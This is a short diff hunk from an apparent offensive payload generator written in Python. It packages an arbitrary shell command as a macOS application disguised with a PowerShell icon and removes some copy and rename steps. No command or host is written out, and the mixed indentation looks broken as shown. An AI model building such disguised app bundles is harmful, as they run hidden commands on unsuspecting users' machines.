@@ -25,15 +25,8 @@ class payload:
 			os.mkdir("payloads")
 		if os.path.exists("payloads/macos_application") == False:
 			os.mkdir("payloads/macos_application")
-                        sas = """
-cp resources/application.app payloads/macos_application
-mv """+icon+""" payloads/"""+name+""".app/Contents/Resources/Powershell.icns
-                        """
 		payload_save_path = "payloads/macos_application/application.app/Contents/MacOS/PowerShell.sh"
                 sas = "payloads/macos_application"
-		os.system("""
-mv payloads/macos_application/application.app payloads/macos_application/"""+name+""".app
-		"""
 		payload = """\
 #! /usr/local/bin/env bash
 """+shell_command+"""
